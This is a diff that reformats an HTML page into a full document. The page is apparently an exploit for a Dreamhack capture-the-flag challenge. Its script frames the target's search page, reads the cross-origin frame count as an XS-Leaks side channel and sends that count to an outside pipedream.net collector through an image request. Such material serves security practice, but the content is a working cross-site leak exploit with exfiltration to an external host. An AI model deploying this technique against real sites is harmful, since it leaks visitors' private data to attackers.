@@ -1,11 +1,21 @@
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-<img id="image">
-<iframe id="frame"></iframe>
-<script>
-    var iframe =  document.getElementById("frame");
-    iframe.src = 'http://host3.dreamhack.games:18236/search?query=DreamHack';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <title>Document</title>
+</head>
+<body>
+    <img id="image">
+    <iframe id="frame"></iframe>
+    <script>
+        var iframe =  document.getElementById("frame");
+        iframe.src = 'http://host3.dreamhack.games:18236/search?query=DreamHack';
 
-    iframe.onload = () => {
-        document.getElementById("image").src = "https://ena4gusnyxj5.x.pipedream.net?" + iframe.contentWindow.frames.length;
-    };
-</script>
+        iframe.onload = () => {
+            document.getElementById("image").src = "https://ena4gusnyxj5.x.pipedream.net?" + iframe.contentWindow.frames.length;
+        };
+    </script>
+</body>
+</html>
